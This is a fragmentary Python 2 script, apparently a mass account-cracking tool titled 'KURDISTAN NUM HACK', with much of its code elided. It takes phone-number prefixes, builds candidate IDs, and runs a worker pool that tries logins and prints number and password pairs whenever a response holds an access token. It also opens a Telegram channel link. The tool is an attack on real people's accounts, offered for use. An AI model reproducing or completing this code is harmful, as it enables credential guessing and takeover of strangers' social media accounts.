...
def menu():
    ...
    print logo
    print 42 * '\x1b[1;91m='
    print '\x1b[1;93m[1] KURDISTAN NUM HACK '
...
def action():
    ...
    if bch == '':
        ...
        os.system('clear')
        print logo
        print '\x1b[1;93m 770 - 771 - 772 \n 750 - 751 - 752 \n 780 - 781 - 782'
        try:
            c = raw_input(' PASTE NUM :) ')
            k = ''
            idlist = '.txt'
        ...
        os.system('clear')
        os.system('xdg-open https://t.me/B_1_2_4')
    elif bch == '3':
        os.system('clear')
        ...
        action()
    xxx = str(len(id))
    psb('\x1b[1;92mTOTAN NUM : ' + xxx)
    time.sleep(0.1)
    psb('\x1b[1;92mPLEASE WAIT FOR CRACK ...')
    time.sleep(0.1)
    psb('\x1b[1;91m[ ! ] FOR STOP THE TOOL CTRL+Z')
    time.sleep(0.5)
    print 42 * '\x1b[1;91m='
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;91m[CP]\x1b[1;91m ' + k + c + user + ' >>> ' + pass1 + '\n'
    ...
    p.map(main, id)
    print 42 * '\x1b[1;91m='
    print '[\xe2\x9c\x93]\x1b[1;93m CRACK STOP...;) ....'
